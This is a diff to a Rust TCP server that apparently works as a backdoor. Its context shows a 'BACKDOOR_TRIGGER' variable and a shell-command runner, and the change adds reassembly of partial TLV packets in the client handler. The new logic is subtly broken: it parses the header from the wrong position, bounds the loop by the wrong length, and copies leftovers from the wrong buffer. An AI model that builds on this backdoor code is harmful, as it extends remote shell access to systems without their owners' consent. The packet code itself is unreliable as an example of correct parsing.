@@ -4,6 +4,7 @@ use std::process::{Command, Output};
 
 const TYPE_LENGTH: u32 = 4;
 const LENGTH_LENGTH: u32 = 4;
+const BUF_LENGTH: usize = 4096;
 
 static mut BACKDOOR_TRIGGER: u32 = 0;
 
@@ -149,7 +150,9 @@ fn run_shell_command(command: &str, args: &[&str]) -> Result<Output, std::io::Er
 }
 
 fn handle_client(mut stream: TcpStream) {
-    let mut buffer = [0; 4096];
+    let mut buffer = [0; BUF_LENGTH];
+
+    let mut incomplete_packet = Vec::new();
 
     loop {
         match stream.read(&mut buffer) {
@@ -159,25 +162,30 @@ fn handle_client(mut stream: TcpStream) {
                 println!("Received {n} bytes");
 
                 let mut bytes = Vec::new();
+                bytes.extend_from_slice(&incomplete_packet[..]);
                 bytes.extend_from_slice(&buffer[..n]);
 
                 let mut offset = 0;
-                while offset < n {
 
-                    if let Some(header) = TLVHeader::from_bytes(&buffer) {
+                while offset + ((TYPE_LENGTH + LENGTH_LENGTH) as usize) <= n {
+
+                    if let Some(header) = TLVHeader::from_bytes(&bytes) {
 
                         offset += (TYPE_LENGTH + LENGTH_LENGTH) as usize;
                         let packet_bytes = &bytes[offset..];
 
                         if let Some(packet) = TLVPacket::from_buf(header, packet_bytes) {
+                            incomplete_packet.clear();
                             let response = packet.handle_packet();
                             stream.write_all(&response).expect("Failed to send response");
 
                             // Move offset to the next packet
                             offset += packet.header.length as usize;
                         } else {
-                            println!("Invalid packet value");
-                            break; // Break the loop if the packet is invalid
+                            println!("Not enough bytes to construct packet");
+                            let hoffset = offset - ((TYPE_LENGTH + LENGTH_LENGTH) as usize);
+                            incomplete_packet.extend_from_slice(&buffer[hoffset..]);
+                            break;
                         }
 
                     } else {
